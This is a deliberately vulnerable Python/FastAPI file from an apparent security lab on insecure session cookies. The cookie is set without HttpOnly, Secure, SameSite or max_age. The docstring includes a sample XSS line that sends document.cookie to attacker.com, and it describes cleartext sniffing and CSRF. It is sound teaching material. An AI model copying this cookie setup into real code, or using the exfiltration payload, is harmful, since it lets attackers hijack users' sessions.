# app/core/cookie_config.py — VULNERABLE version
# Lab 7.4: Insecure Session Cookie Configuration (ASVS V3.3)
# DO NOT USE IN PRODUCTION — educational purposes only
#
# Bug demonstrated:
#   Session cookie is set without HttpOnly, Secure, or SameSite attributes.
#   Each missing attribute enables a distinct class of attack.

from fastapi import Response


def set_session_cookie(response: Response, session_id: str) -> None:
    """Set a session cookie on the response.

    BUG (ASVS V3.3 violation — three distinct missing attributes):

    Missing HttpOnly (V3.3.2):
      JavaScript can read document.cookie and steal the session token.
      An XSS payload stored in a problem title would exfiltrate all
      logged-in contestants\'s sessions to the attacker\'s server:
        fetch("https://attacker.com/steal?c=" + document.cookie)

    Missing Secure (V3.3.1):
      The cookie is sent over plain HTTP as well as HTTPS.
      On a shared network (university Wi-Fi), a passive observer can
      read the session cookie in cleartext and replay it.

    Missing SameSite (V3.3.3):
      Browsers include this cookie on all cross-origin requests, including
      form submissions from attacker.com. This enables CSRF attacks against
      any endpoint that authenticates via cookie (e.g., a server-rendered
      admin console or SSO page).

    Missing max_age:
      Without a max_age or expires attribute, the cookie is a session cookie
      that persists until the browser is closed — or indefinitely in some
      browsers and mobile apps.
    """
    response.set_cookie(
        key="session_id",
        value=session_id,
        # BUG: no httponly  — JavaScript can read and steal this cookie
        # BUG: no secure    — sent over HTTP, visible to network observers
        # BUG: no samesite  — included in cross-origin requests (CSRF)
        # BUG: no max_age   — session lifetime is undefined
    )
